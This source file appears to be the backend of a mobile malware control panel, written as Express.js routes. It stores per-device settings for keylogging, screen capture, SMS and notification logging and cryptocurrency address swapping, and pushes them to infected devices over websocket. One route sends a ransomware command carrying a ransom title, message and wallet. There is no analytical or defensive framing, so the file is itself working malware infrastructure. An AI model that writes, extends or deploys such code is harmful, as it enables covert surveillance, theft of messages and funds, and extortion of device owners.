import express from 'express';
import { getDB } from '../models/Device.js';
const router = express.Router();

router.get('/config/:deviceId', (req, res) => {
  const db = getDB();
  db.get('SELECT * FROM toolkit WHERE device_id = ?', [req.params.deviceId], (err, row) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(row || {
      keylogger: 0, screenlogger: 0, sms_logs: 0, crypto_swap: 0,
      show_notifications: 0, notification_logs: 0,
      ransomware_title: '', ransomware_body: '', ransomware_wallet: ''
    });
  });
});

router.post('/config/:deviceId', (req, res) => {
  const { keylogger, screenlogger, sms_logs, crypto_swap, show_notifications, notification_logs } = req.body;
  const db = getDB();
  db.run(`INSERT INTO toolkit (device_id, keylogger, screenlogger, sms_logs, crypto_swap, show_notifications, notification_logs, updated_at)
    VALUES (?,?,?,?,?,?,?,?)
    ON CONFLICT(device_id) DO UPDATE SET
    keylogger=excluded.keylogger, screenlogger=excluded.screenlogger, sms_logs=excluded.sms_logs,
    crypto_swap=excluded.crypto_swap, show_notifications=excluded.show_notifications,
    notification_logs=excluded.notification_logs, updated_at=excluded.updated_at`,
    [req.params.deviceId, keylogger, screenlogger, sms_logs, crypto_swap, show_notifications, notification_logs, new Date().toISOString()],
    function(err) {
      if (err) return res.status(500).json({ error: err.message });
      const dev = req.app.locals.connectedDevices.get(req.params.deviceId);
      if (dev) dev.ws.send(JSON.stringify({ type: 'config_update', payload: req.body }));
      res.json({ saved: true });
    });
});

router.post('/ransomware/:deviceId', (req, res) => {
  const { title, body, wallet } = req.body;
  const db = getDB();
  db.run(`UPDATE toolkit SET ransomware_title=?, ransomware_body=?, ransomware_wallet=? WHERE device_id=?`,
    [title, body, wallet, req.params.deviceId], function(err) {
      if (err) return res.status(500).json({ error: err.message });
      const dev = req.app.locals.connectedDevices.get(req.params.deviceId);
      if (dev) dev.ws.send(JSON.stringify({ type: 'command', command: 'ransomware', payload: { title, body, wallet } }));
      res.json({ deployed: true });
    });
});

export default router;
